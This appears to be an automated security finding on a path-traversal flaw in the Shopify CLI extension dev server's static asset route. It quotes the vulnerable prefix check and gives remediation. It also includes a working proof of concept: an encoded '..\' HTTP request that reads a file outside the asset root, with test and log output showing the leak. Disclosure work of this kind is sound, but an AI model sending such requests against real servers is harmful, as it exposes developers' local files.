# [p10] App static asset route uses unsafe prefix containment

**Vulnerability class:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

## Summary

The extension development server exposes app-level static assets at `/extensions/assets/:assetKey/**:filePath` and attempts to confine requests to an admin extension `static_root` with a raw `startsWith` string check. Because the attacker-controlled wildcard path is resolved and then compared without a path-segment boundary or canonical symlink target check, a reachable browser/tunnel client can request a sibling-prefix path such as `../public-secret/secret.txt` and receive file contents outside the configured static asset root.

## Details

Admin extensions can publish an app static asset root through `static_root`. The value is converted into the `staticRoot` asset directory by the payload store: [`getAdminConfig` copies `admin.static_root`](https://github.com/shopify/cli/blob/c3e54bea421d23743b5f2b83b34347f5bb729cc4/packages/app/src/cli/services/dev/extension/payload/store.ts#L22-L29), the payload advertises `/extensions/assets/staticRoot/` when it is present, and [`refreshAppAssetDirectories`](https://github.com/shopify/cli/blob/c3e54bea421d23743b5f2b83b34347f5bb729cc4/packages/app/src/cli/services/dev/extension/payload/store.ts#L273-L277) maps it to `joinPath(this.options.appDirectory, adminConfig.staticRoot)`.

When app assets are configured, the HTTP server mounts that directory on the unauthenticated wildcard route [`/extensions/assets/:assetKey/**:filePath`](https://github.com/shopify/cli/blob/c3e54bea421d23743b5f2b83b34347f5bb729cc4/packages/app/src/cli/services/dev/extension/server.ts#L33-L35). The decisive containment check is in [`getAppAssetsMiddleware`](https://github.com/shopify/cli/blob/c3e54bea421d23743b5f2b83b34347f5bb729cc4/packages/app/src/cli/services/dev/extension/server/middlewares.ts#L155-L170):

```ts
export function getAppAssetsMiddleware(getAppAssets: () => Record<string, string> | undefined) {
  return defineEventHandler(async (event) => {
    const {assetKey = '', filePath = ''} = getRouterParams(event)
    const appAssets = getAppAssets()
    const directory = appAssets?.[assetKey]
    if (!directory) {
      return sendError(event, {statusCode: 404, statusMessage: `No app assets configured for key: ${assetKey}`})
    }
    const resolvedDirectory = resolvePath(directory)
    const resolvedFilePath = resolvePath(directory, filePath)
    if (!resolvedFilePath.startsWith(resolvedDirectory)) {
      return sendError(event, {statusCode: 403, statusMessage: 'Path traversal is not allowed'})
    }
    return fileServerMiddleware(event, {
      filePath: resolvedFilePath,
    })
  })
}
```

This comparison treats paths as plain strings. If the configured directory is `/tmp/app/public`, a resolved request target of `/tmp/app/public-secret/secret.txt` still satisfies `resolvedFilePath.startsWith(resolvedDirectory)`. The same design also does not canonicalize symlink targets before serving the file; [`fileServerMiddleware`](https://github.com/shopify/cli/blob/c3e54bea421d23743b5f2b83b34347f5bb729cc4/packages/app/src/cli/services/dev/extension/server/middlewares.ts#L32-L72) simply checks existence and reads the resulting path after the prefix check passes.

## Root Cause

The route implements directory containment with an unsafe string-prefix comparison instead of a path-aware containment check. It normalizes the requested path, but it does not require the result to be equal to the root or contained below `root + pathSeparator`, and it does not compare canonical `realpath` values to prevent symlink escapes.

## Proof of Concept (PoC)

**PoC-Status:** executed.

The executed PoC is `piolium/findings/p10-app-assets-prefix-path-traversal/poc.sh`. It writes a temporary Vitest that imports the real `getAppAssetsMiddleware`, creates a permitted `public/allowed.txt` and an outside sibling `public-secret/secret.txt`, mounts the real route, then requests the sibling through an encoded wildcard path:

```bash
bash piolium/findings/p10-app-assets-prefix-path-traversal/poc.sh
```

The minimal exploit request used by the test was:

```http
GET /extensions/assets/staticRoot/%2e%2e%5cpublic-secret%5csecret.txt HTTP/1.1
Host: 127.0.0.1:<dev-server-port>
```

The run completed successfully:

```text
✓ src/cli/services/dev/extension/server/__piolium_app_assets_poc.test.ts > app static asset traversal PoC > leaks a sibling-prefix file through the real app asset middleware 27ms

Test Files  1 passed (1)
```

The decisive impact evidence in `evidence/impact.log` shows that the configured root was `public`, the requested file was in the sibling `public-secret`, and the HTTP response returned the marker from the outside file:

```text
configured_static_root=/var/folders/2k/z4j3lfxj5fv7r20hswc8sj8r0000gn/T/shopify-app-assets-poc-BIzPqn/public
outside_sibling_file=/var/folders/2k/z4j3lfxj5fv7r20hswc8sj8r0000gn/T/shopify-app-assets-poc-BIzPqn/public-secret/secret.txt
request=GET /extensions/assets/staticRoot/%2e%2e%5cpublic-secret%5csecret.txt
http_status=200
response_body=PIOLIUM_APP_ASSETS_SECRET_1777623063127
security_effect=outside sibling file contents returned in HTTP response
```

## Impact

Any client that can reach the extension dev server or its public tunnel can read files that escape the configured app asset root when a sibling-prefix path or symlink layout exists in the project. The demonstrated effect is disclosure of a local file outside `static_root` through an unauthenticated HTTP response. In practice, exposure is limited to environments where the Shopify CLI dev server is running with an admin extension `static_root` configured, but those sessions commonly proxy local developer resources through a browser/tunnel boundary.

## Remediation

Replace the `startsWith` check with path-aware containment. After resolving and canonicalizing both the configured root and requested target, allow only the root itself or descendants whose relative path does not start with `..` and is not absolute. Also resolve symlinks with `realpath` before comparison, reject encoded separator traversal consistently, and add regression tests for sibling-prefix paths such as `public-secret` and symlink escapes under `/extensions/assets/:assetKey/**:filePath`.

## Confirmation (V4)
Confirm-Status: confirmed-live
Confirm-Timestamp: 2026-05-01T09:00:29Z
Confirm-Evidence: piolium/findings/p10-app-assets-prefix-path-traversal/evidence/confirmed-20260501T090022Z.log
Confirm-Variant-Count: 2
Confirm-FpCheck: not-run
Confirm-Notes: sibling public-secret/secret.txt contents in HTTP body; variant1 live mock route probe recorded; variant2 started real setupHTTPServer app-assets route with vulnerable staticRoot; Encoded backslashes become route filePath "..\public-secret\secret.txt"; pathe resolvePath normalizes them before the unsafe startsWith check.
Confirm-Queued-V5: no
